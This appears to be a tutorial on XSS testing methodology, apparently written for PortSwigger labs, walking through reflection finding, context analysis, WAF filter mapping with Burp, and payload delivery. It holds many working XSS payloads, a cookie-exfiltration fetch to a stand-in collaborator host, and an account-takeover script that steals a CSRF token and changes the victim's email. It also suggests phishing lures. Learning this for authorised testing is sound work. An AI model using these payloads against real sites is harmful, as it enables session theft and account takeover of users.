# XSS Methodology

> The systematic step-by-step process for testing XSS vulnerabilities.  
> Understanding the system — not pasting payloads into tools.

---

## The Core Principle

```
WRONG approach:   Paste <script>alert(1)</script> everywhere and hope
CORRECT approach: Understand the system → find the surface → map the defense → match the technique
```

Every step below exists for a reason. Skipping steps wastes time and misses vulnerabilities.

---

## The 5-Step XSS Testing Process

```
Step 1 → Find the Reflection Point      — where does input land?
Step 2 → Identify the Context           — what surrounds the input?
Step 3 → Map What is Filtered           — what does the defense block?
Step 4 → Match Context to Technique     — which escape method applies?
Step 5 → Build the Delivery Mechanism   — how does the victim trigger it?
```

---

## Step 1 — Find the Reflection Point

### Submit a Unique Identifier

Send a recognizable string through every input and find where it appears in the response.

```
Input: xsstest123
```

**How to find reflections:**

```
Method 1 — Manual:
Submit input → View Page Source (CTRL+U) → CTRL+F → search "xsstest123"
Every match is a reflection point

Method 2 — Burp Suite:
Proxy → Intercept request
Send to Repeater → modify parameter → check response
Search response for your identifier

Method 3 — Burp Scanner:
Active scan on target
Automatically finds reflection points
```

### What to Check

```
☐ URL query parameters      ?search=xsstest123
☐ URL path segments         /user/xsstest123
☐ URL fragment              #xsstest123  (check JS for location.hash)
☐ All form fields           name, email, message, comment
☐ HTTP headers              User-Agent, Referer, X-Forwarded-For
☐ Hidden form fields        modify via browser DevTools
☐ JSON API parameters       {"name":"xsstest123"}
☐ File upload filenames     xsstest123.jpg
```

### Key Questions

```
Does the input appear in the response?            → potential XSS point
Does it appear multiple times?                    → multiple injection contexts
Does it appear in the HTML head?                  → meta tags, canonical, link tags
Does it appear inside a script block?             → JavaScript context
Does it appear after the page loads via JS?       → DOM-based XSS
```

---

## Step 2 — Identify the Context

This is the most important step. The context determines everything else.

### Test Characters to Identify Context

Submit these characters and observe what the server does with them:

```
< > " ' ` \ / ; ( ) { } =
```

All at once:
```
xsstest123<>"'`\;(){}=
```

Then view source and find your test string. What happened to each character?

### The Six Contexts

**Context 1 — Between HTML Tags**
```html
<p>xsstest123</p>
<div>xsstest123</div>
```
Your input is raw text between elements. New tags can be injected directly.

---

**Context 2 — Inside an HTML Attribute Value**
```html
<input value="xsstest123">
<img alt="xsstest123">
<a href="https://site.com?q=xsstest123">
```
Input is inside an attribute. Need to break out with `"` or `'`.

---

**Context 3 — Inside an href or src Attribute**
```html
<a href="xsstest123">
<iframe src="xsstest123">
```
URL context. The `javascript:` pseudo-protocol is available.

---

**Context 4 — Inside a JavaScript String**
```html
<script>
    var x = 'xsstest123';
    var y = "xsstest123";
    var z = `xsstest123`;
</script>
```
Inside JS code. Need to break out of the string literal.
Single quoted, double quoted, or template literal — each needs a different approach.

---

**Context 5 — Inside a JavaScript Event Handler**
```html
<a onclick="doSomething('xsstest123')">
<input onfocus="track('xsstest123')">
```
Inside an attribute that contains JavaScript.
HTML decoding happens before JavaScript parsing — HTML entities can bypass filters here.

---

**Context 6 — Inside an HTML Comment**
```html
<!-- User searched for: xsstest123 -->
```
Inside a comment. Need to close the comment first with `-->`.

---

## Step 3 — Map What is Filtered

Once you know the context, test what the defense blocks and allows.

### Manual Character Testing

Test each dangerous character individually:

```
xsstest123<         → does < get encoded to &lt;?
xsstest123>         → does > get encoded to &gt;?
xsstest123"         → does " get encoded to &quot;?
xsstest123'         → does ' get escaped to \'?
xsstest123\         → does \ get escaped to \\?
xsstest123`         → does ` get escaped?
xsstest123(         → are parentheses blocked?
xsstest123;         → are semicolons blocked?
```

Record what survives. That list is your toolkit.

### WAF Tag Testing with Burp Intruder

When a WAF is present, test every HTML tag systematically:

```
Setup:
GET /?search=<§tag§> HTTP/1.1

Payload list: full tag list from PortSwigger XSS cheat sheet
Attack type:  Sniper

Results:
200 → tag is allowed  ← potential weapon
400 → tag is blocked  ← move on
```

### WAF Event Testing with Burp Intruder

Once you find an allowed tag, test which event handlers work on it:

```
Setup:
GET /?search=<body §event§=xsstest123> HTTP/1.1

Payload list: full event handler list from PortSwigger XSS cheat sheet
Attack type:  Sniper

Results:
200 with event in response → event is allowed  ← potential weapon
400 or no event in response → event is blocked ← move on
```

### What to Record

```
Allowed tags:    <body> <svg> <animatetransform> <custom> ...
Allowed events:  onresize, onbegin, onfocus, onbegin ...
Blocked chars:   < > " ' \ ; ( ) ...
Surviving chars: whatever is NOT in the blocked list
```

---

## Step 4 — Match Context to Technique

Use your findings from Steps 2 and 3 to select the correct technique.

### The Decision Tree

```
Where does input land?
│
├── Between HTML tags
│   ├── No filtering          → <script>alert(1)</script>
│   └── Script blocked        → <img src=1 onerror=alert(1)>
│
├── Inside HTML attribute
│   ├── Can use < > ?         → "><script>alert(1)</script>
│   ├── Angle brackets blocked → " autofocus onfocus=alert(1) x="
│   ├── href attribute        → javascript:alert(1)
│   └── JS inside attribute   → &apos;-alert(1)-&apos;
│                               (HTML entity bypasses server filter)
│
├── Inside JavaScript string
│   ├── Single quoted
│   │   ├── Nothing escaped   → ';alert(1)//
│   │   ├── Quote escaped     → \';alert(1)//  (double backslash)
│   │   └── Both escaped      → </script><img onerror=alert(1)>
│   │                           (pivot to HTML parser level)
│   ├── Double quoted         → ";alert(1)//
│   └── Template literal      → ${alert(1)}  (no breaking needed)
│
├── Inside canonical/meta tag
│   └── Single quote works    → 'accesskey='x'onclick='alert(1)
│                               delivered via URL
│
└── DOM-based context
    ├── innerHTML sink        → <img src=1 onerror=alert(1)>
    ├── eval() sink           → alert(1)
    └── location sink         → javascript:alert(1)
```

### Context vs Technique Quick Reference

| Context | Characters Available | Primary Technique |
|---|---|---|
| Between tags, nothing blocked | All | `<script>alert(1)</script>` |
| Between tags, script blocked | `<>` work | `<img src=1 onerror=alert(1)>` |
| Attribute, angle brackets encoded | `"` works | `" onfocus=alert(1) autofocus x="` |
| href attribute | All | `javascript:alert(1)` |
| JS single quoted string | `'` not escaped | `'-alert(1)-'` or `';alert(1)//` |
| JS string, quote escaped | `\` not escaped | `\';alert(1)//` |
| JS string, all escaped | None useful | `</script><img onerror=alert(1)>` |
| JS template literal | All | `${alert(1)}` |
| Event handler attribute | `'` escaped | `&apos;-alert(1)-&apos;` |
| WAF present | Depends on recon | SVG tags + obscure events |

---

## Step 5 — Build the Delivery Mechanism

Finding XSS is step one. Getting a victim to trigger it is step two.

### No Interaction Required — Best Case

```
Stored XSS:
→ Payload saved in database
→ Fires for every visitor automatically
→ No delivery needed

Reflected XSS with autofocus:
<input autofocus onfocus=alert(1)>
→ Focuses automatically on page load
→ Victim just needs to visit the URL

onresize via iframe:
<iframe src="vuln-site/?payload" onload="this.style.width='1px'">
→ Iframe resize triggers onresize automatically
→ Victim visits exploit server page — that's all
```

### User Interaction Required — Acceptable

```
accesskey technique:
'accesskey='x'onclick='alert(1)
→ Victim presses ALT+SHIFT+X
→ Social engineer the keypress: "Press ALT+SHIFT+X to skip this ad"

Click required:
<a href="javascript:alert(1)">Click here to continue</a>
→ Label it something compelling
→ PortSwigger labs require labeling it "Click"
```

### Exploit Server Delivery

When the attack requires a hosting point:

```
Scenario 1 — Direct URL delivery:
Craft malicious URL → send to victim via phishing
Victim clicks → reflected payload executes

Scenario 2 — iframe delivery (for onresize etc):
Host on exploit server:
<iframe src="https://vuln-site/?payload" onload="this.style.width='1px'">
Victim visits exploit server → iframe loads → resize fires → payload executes

Scenario 3 — location= redirect:
Host on exploit server:
<script>location='https://vuln-site/?payload'</script>
Victim visits exploit server → redirected → payload executes on vuln site

Scenario 4 — Two-visit attack (dangling markup, CSRF token theft):
Visit 1: Victim redirected to target page → data captured in window.name
Visit 2: Victim returns to exploit server → script reads window.name → uses stolen data
```

---

## Burp Suite Workflow

### Standard XSS Test Flow

```
1. Open Burp Suite → turn on Proxy → open browser
2. Browse target normally → all traffic captured in HTTP History
3. Find interesting requests → right-click → Send to Repeater
4. In Repeater → modify parameter → send → inspect response
5. Search response for your input → identify context
6. Test characters → build payload → confirm execution
7. If WAF present → send to Intruder → run tag/event scan
8. Build final payload → test in browser → confirm alert fires
```

### Intruder Setup for WAF Recon

```
Tag testing:
Request:  GET /?search=<§§> HTTP/1.1
Positions: mark §§ between the angle brackets
Payloads:  paste tag list
Attack:    Sniper
Filter:    Status = 200

Event testing:
Request:  GET /?search=<body §§=1> HTTP/1.1
Positions: mark §§ where event goes
Payloads:  paste event list
Attack:    Sniper
Filter:    Status = 200 AND response contains your event name
```

---

## Confirming Real Impact — Beyond alert()

Once `alert()` fires, prove real impact with escalating payloads:

### Level 1 — Confirm Domain
```javascript
alert(document.domain)
// Confirms which domain is vulnerable
```

### Level 2 — Confirm Cookie Access
```javascript
alert(document.cookie)
// Confirms cookies are readable (not HttpOnly)
```

### Level 3 — Data Exfiltration
```javascript
fetch('https://collaborator.com?c=' + document.cookie)
// Proves data can leave the victim's browser
```

### Level 4 — Account Takeover
```javascript
// Steal CSRF token and change email
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
      let token = html.match(/csrf" value="([^"]+)"/)[1];
      fetch('/my-account/change-email', {
          method: 'POST',
          body: `email=attacker@evil.com&csrf=${token}`
      });
  });
```

---

## Common Mistakes to Avoid

```
❌ Testing only the search box — check ALL parameters
❌ Stopping after the first blocked payload — try other contexts
❌ Ignoring page source — always view source after submission
❌ Forgetting HTTP headers — User-Agent and Referer are often reflected
❌ Ignoring DOM sources — check JS for location.hash, document.URL usage
❌ Not repairing the script — broken JS after your injection stops execution
❌ Testing in Firefox when target uses Chrome — behavior differs
❌ Forgetting that alert() in cross-origin iframes is blocked in Chrome 92+
    → use print() instead
```

---

## Methodology Summary Card

```
┌─────────────────────────────────────────────────────────────┐
│                    XSS METHODOLOGY                          │
├─────────────────────────────────────────────────────────────┤
│  1. FIND      Submit unique ID → search in page source      │
│  2. CONTEXT   What surrounds the reflection?                │
│  3. FILTER    What characters/tags survive?                 │
│  4. TECHNIQUE Match context + surviving chars to payload    │
│  5. DELIVER   Craft URL or exploit server page              │
├─────────────────────────────────────────────────────────────┤
│  Tools: Burp Proxy → Repeater → Intruder → Collaborator    │
│  Always: View Source → DevTools Console → Network Tab       │
└─────────────────────────────────────────────────────────────┘
```

---

*Next → [Payloads](./payloads.md) — every payload with full character breakdowns*